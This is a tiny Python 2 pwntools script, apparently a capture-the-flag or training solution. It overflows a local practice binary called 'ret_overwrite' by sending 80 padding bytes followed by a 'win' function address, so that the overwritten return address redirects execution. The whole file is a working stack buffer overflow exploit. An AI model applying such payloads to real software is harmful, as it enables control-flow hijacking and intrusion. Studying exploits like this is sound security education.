#!/usr/bin/python
from pwn import *

win_addr = 0x4005e7

p = process("./ret_overwrite")
p.sendline("A" * 80 + p64(win_addr))
print p.read()
